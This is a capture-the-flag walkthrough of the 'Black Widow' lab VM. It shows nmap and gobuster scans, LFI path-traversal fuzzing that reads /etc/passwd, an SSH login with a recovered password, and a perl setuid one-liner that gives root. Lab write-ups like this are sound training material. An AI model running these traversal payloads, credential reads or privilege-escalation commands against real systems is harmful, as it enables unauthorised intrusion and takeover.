Target: 10.0.0.24

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.24

    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    111/tcp   open  rpcbind
    2049/tcp  open  nfs
    3128/tcp  open  squid-http
    41103/tcp open  unknown
    42933/tcp open  unknown
    50367/tcp open  unknown
    58671/tcp open  unknown

## ***HTTP***

Going to ***http://10.0.0.24*** we don't have anything interesting. After brute forcing the directories I found something useful.

    # gobuster dir -u http://10.0.0.24/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php

    /docs                 (Status: 301) [Size: 305] [--> http://10.0.0.24/docs/]
    /index.html           (Status: 200) [Size: 84]                              
    /company              (Status: 301) [Size: 308] [--> http://10.0.0.24/company/]
    /js                   (Status: 301) [Size: 303] [--> http://10.0.0.24/js/]     
    /server-status        (Status: 403) [Size: 274] 

Going to the ***/company*** directory we have a site running on Arsha ().
Going to ***http://10.0.0.21/company/started.php*** we are redirect to ***http://blackwidow/company/started.php***.  
Let's add the domain name 'blackwidow' to our hosts file.

Found a comment on ***http://blackwidow/company:***

    <!-- =======================================================
    * Template Name: Arsha - v3.0.3
    * Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ========================================================

    We are working to develop a php inclusion method using "file" parameter - Black Widow DevOps Team.

    -->

We need to find a php file for this to work.

    # gobuster dir -u http://blackwidow/company/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php

    /assets               (Status: 301) [Size: 317] [--> http://blackwidow/company/assets/]
    /forms                (Status: 301) [Size: 316] [--> http://blackwidow/company/forms/] 
    /started.php          (Status: 200) [Size: 42271] 

Let's use ***WFUZZ*** to find the write paylod.

    # wfuzz -c -z file,/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u 'blackwidow/company/started.php?file=FUZZ' --hh 0

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000062:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../..
                                                            /../../etc/passwd"                        
    000000060:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../et
                                                            c/passwd"                                 
    000000061:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../..
                                                            /etc/passwd"                              
    000000404:   200        55 L     55 W       727 Ch      "../../../../../../../../../../../../../..
                                                            /etc/group"                               
    000000403:   200        55 L     55 W       727 Ch      "../../../../../../../../../../../../../et
                                                            c/group" 

>

    # curl 'http://10.0.0.24/company/started.php?file=../../../../../../../../../../../../../../../../../../etc/passwd'

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
    sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
    _rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
    statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin

We have the user ***viper*** on the machine.

I fuzzed more and found out that the file ***/etc/apache2/apache2.conf*** is on the machine. Let's see if ***apache2*** has any log files we can poison.

***apache2*** has log files on ***/var/log/apache2/access.log***.

http://10.0.0.24/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log

For some reason I wasn't able to find poison and view the log files, but I found another file in the /var/backups directory called auth.log. After reading it we can find the password for the user viper on the machine.

    viper:?V1p3r2020!?

>

    # ssh viper@10.0.0.24
    password: ?V1p3r2020!?

    $ cat local.txt 
    d930fe79919376e6d08972dae222526b

Going to ***/home/viper/backup_site/assets/vendor/weapon/*** we have an exec named ***arsenic*** that is a copy of the perl command.

I searched for perl privilege escalation and this article ***https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/***. Following the commands mentioned I was able to get a shell as the root user.

    $ ./arsenic -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
    # id -a 
    uid=0(root) gid=1001(viper) groups=1001(viper)



▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪


Congrats!

You've rooted Black Widow!

0xJin - mindsflee
Follow on Instagram: 0xjiin
Follow on Twitter: 0xJin , @mindsflee


0780eb289a44ba17ea499ffa6322b335


